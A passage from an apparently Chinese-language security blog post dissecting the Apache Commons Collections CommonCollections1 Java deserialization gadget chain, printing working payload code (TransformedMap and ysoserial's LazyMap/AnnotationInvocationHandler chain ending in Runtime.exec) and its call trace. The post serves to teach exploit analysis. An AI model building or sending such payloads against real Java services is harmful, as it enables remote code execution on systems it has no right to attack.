<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>終於，看到我們朝思暮想的 <code>valueTransformer.transform(value)</code> 了 !</p>
<p>所以我們就能把前面任意代碼執行的 Code，改成用 <code>TransformedMap</code> 的 <code>setValue()</code> 來觸發了:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</div><div class="line">    Transformer[] transformer_arr = <span class="keyword">new</span> Transformer[] &#123;</div><div class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"/usr/bin/touch /tmp/rce"</span>&#125;)</div><div class="line">    &#125;;</div><div class="line">    Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformer_arr);</div><div class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</div><div class="line">    innerMap.put(<span class="keyword">null</span>, <span class="keyword">null</span>);</div><div class="line"></div><div class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, chain);</div><div class="line">    Set set = outerMap.entrySet();</div><div class="line">    Iterator it = set.iterator();</div><div class="line">    Map.Entry ent = (Map.Entry) it.next();</div><div class="line"></div><div class="line">    <span class="comment">// Trigger</span></div><div class="line">    ent.setValue(<span class="keyword">null</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>但一樣還是沒解決自動觸發的問題，這裡仍然是我們手動去呼叫 <code>setValue()</code></p>
<p>而且還有前面提過的 <code>iterator()</code>, <code>next()</code> 等方法，其實都是我們手動去執行的</p>
<p>需要找到一個 gadget 可以幫我們完成這些事情</p>
<p><br></p>
<p>而滿足我們要求的 gadget 就是下面要講的這個 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 類別:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * InvocationHandler for dynamic proxy implementation of Annotation.</div><div class="line"> *</div><div class="line"> * <span class="doctag">@author</span>  Josh Bloch</div><div class="line"> * <span class="doctag">@since</span>   1.5</div><div class="line"> */</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6182022883658399397L</span>;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></div><div class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</div><div class="line">        s.defaultReadObject();</div><div class="line"></div><div class="line"></div><div class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></div><div class="line"></div><div class="line">        AnnotationType annotationType = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            annotationType = AnnotationType.getInstance(type);</div><div class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</div><div class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</div><div class="line"></div><div class="line"></div><div class="line">        <span class="comment">// If there are annotation members without values, that</span></div><div class="line">        <span class="comment">// situation is handled by the invoke method.</span></div><div class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</div><div class="line">            String name = memberValue.getKey();</div><div class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</div><div class="line">            <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></div><div class="line">                Object value = memberValue.getValue();</div><div class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</div><div class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</div><div class="line">                        memberValue.setValue(</div><div class="line">                        <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</div><div class="line">                            value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</div><div class="line">                        annotationType.members().get(name)));</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到 <code>memberValues</code> 就是一個 <code>Map&lt;String, Object&gt;</code></p>
<p>而 <code>readObject()</code> 方法中，for 迴圈的寫法，實際上就恰巧用到了 <code>iterator()</code> 和 <code>next()</code> !</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>這裡的 for 迴圈背後，實際上大致等同於</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(Iterator iterator = memberValues.entrySet().iterator(); iterator.hasNext();) &#123;</div><div class="line">    Map.Entry&lt;String, Object&gt; memberValue = iterator.next();</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以這裡我們就一口氣用到了剛剛沒串起來的 <code>entrySet()</code>, <code>iterator()</code>, <code>next()</code> !</p>
<p>最後面則去呼叫了 <code>memberValue.setValue(...)</code>，導致我們整條 chain 被觸發 !</p>
<p>加上是 <code>readObject()</code> 方法的關係，所以反序列化時會自動呼叫該方法</p>
<p>自動觸發整個反序列化 gadget chain，達到任意代碼執行</p>
<p>打完收工 !</p>
<p><br></p>
<h2 id="u7B2C_u4E8C_u689D_u8DEF"><a href="#u7B2C_u4E8C_u689D_u8DEF" class="headerlink" title="第二條路"></a>第二條路</h2><p>其實如果你去看 ysoserial 的 code</p>
<p>會發現它用的其實不是 <code>TransformedMap</code>，而是走我們現在要講的 <code>LazyMap</code> 這條路</p>
<p>概念都大同小異，就是想辦法找條路去觸發 transformer 的 <code>transform()</code> 方法</p>
<p><br></p>
<p>先來看看初始化的部分:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>(map);</div><div class="line">    <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">this</span>.factory = factory;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>這裡 <code>decorate()</code> 一樣會去設定 Map 和 Transformer</p>
<p>而我們看一下 <code>LazyMap.get()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</div><div class="line">    <span class="comment">// create value for key if key is not currently in the map</span></div><div class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</div><div class="line">        Object value = factory.transform(key);</div><div class="line">        map.put(key, value);</div><div class="line">        <span class="keyword">return</span> value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> map.get(key);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>這裡直接就呼叫了 <code>factory.transform(key)</code></p>
<p>所以我們只要想辦法透過 <code>readObject()</code> 去呼叫 <code>LazyMap.get()</code> 就能觸發整個反序列化 Chain</p>
<p>但事情沒那麼簡單，找不到那麼單純的 <code>readObject()</code> 可以直接呼叫 <code>get()</code>  (至少我沒找到QQ)</p>
<p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java" target="_blank" rel="external">CommonCollections1</a> 的方式是透過 Dynamic Proxy 的方式去呼叫這個方法</p>
<blockquote>
<p>代理模式:<br>是一種設計模式(Design Pattern)。簡單說，就是找一個代理人，然後把事情都丟給他做 (沒錯，就是進藤光跟佐為的關係)<br>而對於 java 靜態代理和動態代理不熟的讀者，推薦參考<a href="https://zhuanlan.zhihu.com/p/65501610" target="_blank" rel="external">這篇文章</a> </p>
</blockquote>
<p>我們直接看 ysoserial 中構造 Payload 的方法:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Gadgets.createMemoitizedProxy()</span></div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createMemoitizedProxy</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    <span class="keyword">return</span> createProxy(createMemoizedInvocationHandler(map), iface, ifaces);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Gadgets.createMemoizedInvocationHandler()</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    <span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Gadgets.createProxy()</span></div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createProxy</span> <span class="params">( <span class="keyword">final</span> InvocationHandler ih, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> </span>&#123;</div><div class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + <span class="number">1</span>);</div><div class="line">    allIfaces[ <span class="number">0</span> ] = iface;</div><div class="line">    <span class="keyword">if</span> ( ifaces.length &gt; <span class="number">0</span> ) &#123;</div><div class="line">        System.arraycopy(ifaces, <span class="number">0</span>, allIfaces, <span class="number">1</span>, ifaces.length);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name) <span class="keyword">throws</span> Exception &#123;</div><div class="line">    <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</div><div class="line">    setAccessible(ctor);</div><div class="line">    <span class="keyword">return</span> ctor;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Reflections.setFieldValue()</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</div><div class="line">    field.set(obj, value);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</div><div class="line">    <span class="comment">// inert chain for setup</span></div><div class="line">    <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</div><div class="line">        <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</div><div class="line">    <span class="comment">// real chain for after setup</span></div><div class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</div><div class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</div><div class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;</div><div class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</div><div class="line">                <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</div><div class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</div><div class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</div><div class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</div><div class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</div><div class="line">                <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</div><div class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</div><div class="line"></div><div class="line">    <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</div><div class="line"></div><div class="line">    <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</div><div class="line"></div><div class="line">    <span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</div><div class="line"></div><div class="line">    <span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</div><div class="line"></div><div class="line">    Reflections.setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers); <span class="comment">// arm with actual transformer chain</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> handler;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>先來看 <code>createMemoizedInvocationHandler()</code> 中的這段:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</div></pre></td></tr></table></figure>
<p>上面這行就是對應到這段:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</div><div class="line">    <span class="keyword">this</span>.type = type;</div><div class="line">    <span class="keyword">this</span>.memberValues = memberValues;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以 <code>createMemoitizedProxy</code> 實際上就是建立了一個 <code>Map</code> 介面的 Proxy (<code>mapProxy</code>)</p>
<p>並將 <code>memberValues</code> 設為 <code>LazyMap</code> 的 <code>AnnotationInvocationHandler</code></p>
<p>而下一行的 <code>handler</code> 則是建立 <code>memberValues</code> 為 <code>mapProxy</code> 的 <code>AnnotationInvocationHandler</code> 物件</p>
<p>這個 <code>handler</code> 就是我們要反序列化觸發 gadget chain 的惡意物件 !</p>
<p><br></p>
<p>關鍵在於，<code>AnnotationInvocationHandler</code> 反序列化時，會去呼叫 <code>readObject()</code> 方法，並且其中又會去呼叫 <code>memberValues.entrySet()</code></p>
<p>若 <code>memberValues</code> 是一個代理物件，就會去呼叫對應 handler 的 <code>invoke()</code> 方法</p>
<p>而 <code>AnnotationInvocationHandler.invoke()</code> 如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</div><div class="line">    String member = method.getName();</div><div class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</div><div class="line"></div><div class="line">    <span class="comment">// Handle Object and Annotation methods</span></div><div class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"equals"</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</div><div class="line">        paramTypes[<span class="number">0</span>] == Object.class)</div><div class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</div><div class="line">    <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"toString"</span>))</div><div class="line">        <span class="keyword">return</span> toStringImpl();</div><div class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"hashCode"</span>))</div><div class="line">        <span class="keyword">return</span> hashCodeImpl();</div><div class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"annotationType"</span>))</div><div class="line">        <span class="keyword">return</span> type;</div><div class="line"></div><div class="line">    <span class="comment">// Handle annotation member accessors</span></div><div class="line">    Object result = memberValues.get(member);</div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>會一直走到 <code>memberValues.get(member)</code></p>
<p>也就對應到前面講的 <code>LazyMap.get()</code></p>
<p>成功觸發反序列化 chain 執行 !</p>
<p><br></p>
<h2 id="u7E3D_u7D50"><a href="#u7E3D_u7D50" class="headerlink" title="總結"></a>總結</h2><p>這篇介紹了 CommonCollections1 的兩種 gadget chain</p>
<p>其中 <code>LazyMap</code> 的呼叫流程可以簡化成如下所示:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">ObjectInputStream.readObject()</div><div class="line">  AnnotationInvocationHandler.readObject()</div><div class="line">    Map(Proxy).entrySet()</div><div class="line">      AnnotationInvocationHandler.invoke()</div><div class="line">        LazyMap.get()</div><div class="line">          ChainedTransformer.transform()</div><div class="line">            ConstantTransformer.transform()</div><div class="line">            InvokerTransformer.transform()</div><div class="line">              Method.invoke()</div><div class="line">                Class.getMethod()</div><div class="line">            InvokerTransformer.transform()</div><div class="line">              Method.invoke()</div><div class="line">                Runtime.getRuntime()</div><div class="line">            InvokerTransformer.transform()</div><div class="line">              Method.invoke()</div><div class="line">                Runtime.exec()</div></pre></td></tr></table></figure>
<p>這條 gadget chain 的關鍵在於動態代理的利用方式，第一次看時腦袋會比較難轉過來</p>
<p>而另一條 gadget chain 就相對沒那麼複雜，是透過串 Map Entry 的 iterator 各種操作到達 <code>setValue()</code> 觸發整條 chain 執行</p>
<p><br></p>
<p>本篇文章分析了 Common Collections 漏洞中非常經典的 CommonCollections1 這條 Gadget Chain</p>
<p>而以 Common Collections 來說，除了 CommonCollections1 以外，其實還有 CommonCollections2, 3, 4, 5, … 各種 chain</p>
<p>如果我有時間的話，也許未來會再分析看看其他條 chain (吧)</p>
<p><br></p>
<blockquote>
<p>不知不覺又寫了一篇 Java，感覺繼續下去也許有機會變成一系列 Java 大合集 (?</p>
</blockquote>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/09/02/DEFCON-30-CTF-Final-參加記/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          DEFCON 30 CTF Final 參加記
        
      </div>
    </a>
  
  
    <a href="/2020/02/26/Java反序列化之URLDNS與GadgetProbe/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">Java 反序列化之 URLDNS 與 GadgetProbe</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>


<div class="share_jia">
	<!-- JiaThis Button BEGIN -->
	<div class="jiathis_style">
		<span class="jiathis_txt">Share to: &nbsp; </span>
		<a class="jiathis_button_facebook"></a> 
    <a class="jiathis_button_twitter"></a>
    <a class="jiathis_button_plus"></a> 
    <a class="jiathis_button_tsina"></a>
		<a class="jiathis_button_cqq"></a>
		<a class="jiathis_button_douban"></a>
		<a class="jiathis_button_weixin"></a>
		<a class="jiathis_button_tumblr"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
	</div>
	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
	<!-- JiaThis Button END -->
</div>








<section id="comments">
  <div id="disqus_thread"></div>
    <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'kaibrosblog'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</section>

</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2022 KaiBro
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.1.6/require.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script src="/js/main.js"></script>


<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-61797645-2', 'auto');
  ga('send', 'pageview');

</script>



<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>



  </div>
</body>
</html>